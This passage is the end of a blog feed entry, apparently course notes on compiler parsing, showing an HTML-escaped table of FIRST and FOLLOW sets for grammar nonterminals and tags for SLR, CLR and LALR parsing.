class=&quot;math inline&quot;&gt;{&lt;em&gt;ε&lt;/em&gt;, (,&lt;em&gt;a&lt;/em&gt;, &lt;em&gt;b&lt;/em&gt;}&lt;/span&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{$, ), +}&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;P&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{(,&lt;em&gt;a&lt;/em&gt;, &lt;em&gt;b&lt;/em&gt;}&lt;/span&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{$, (,), *, +, &lt;em&gt;a&lt;/em&gt;, &lt;em&gt;b&lt;/em&gt;}&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;Z&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{&lt;em&gt;ε&lt;/em&gt;, *}&lt;/span&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{$, (,), +, &lt;em&gt;a&lt;/em&gt;, &lt;em&gt;b&lt;/em&gt;}&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;</summary>
    
    
    
    <category term="Computer Science" scheme="https://www.sky-learner.top/categories/Computer-Science/"/>
    
    
    <category term="Compiler" scheme="https://www.sky-learner.top/tags/Compiler/"/>
    
    <category term="CS323" scheme="https://www.sky-learner.top/tags/CS323/"/>
    
    <category term="Parsing" scheme="https://www.sky-learner.top/tags/Parsing/"/>
    
    <category term="SLR" scheme="https://www.sky-learner.top/tags/SLR/"/>
    
    <category term="CLR" scheme="https://www.sky-learner.top/tags/CLR/"/>
    
    <category term="LALR" scheme="https://www.sky-learner.top/tags/LALR/"/>
    
  </entry>
  
</feed>
